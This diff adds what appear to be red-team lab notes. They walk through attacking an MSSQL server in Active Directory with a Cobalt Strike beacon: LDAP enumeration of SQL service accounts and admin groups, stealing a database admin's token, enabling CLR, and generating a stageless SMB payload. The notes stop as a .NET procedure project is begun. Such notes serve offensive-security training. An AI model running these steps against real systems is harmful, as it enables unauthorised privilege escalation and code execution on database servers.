@@ -1,0 +1,33 @@
+search for MSSQL servers with kerberos auth
+    beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
+
+we see lon-db-1 has a mssql_svc
+let's query info about the instance and our privs on it
+    beacon> sql-info lon-db-1    
+    beacon> sql-whoami lon-db-1
+
+this shows us that we have no privs, authenticating a pchilds
+let's search for principals with sysadmin privs
+    beacon> ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
+
+this shows us that rsteel is a database admin!
+let's impersonate rsteel and re enumerate
+    steal token from rsteel
+    beacon> sql-whoami lon-db-1
+
+now we have all admin privs!
+let's check the status of CLR
+    beacon> sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
+
+returns 0 (disabled), so let's enable it
+    beacon> sql-enableclr lon-db-1
+
+now let's generate an x64 smb payload
+    payload > windows stagless payload
+    listener: smb
+    output: raw
+    exit function: thread
+    save to C:\Payloads\smb_x64.xthread.bin
+
+now in vscode create a new class library (.NET Framework) project names MyProcedure
+
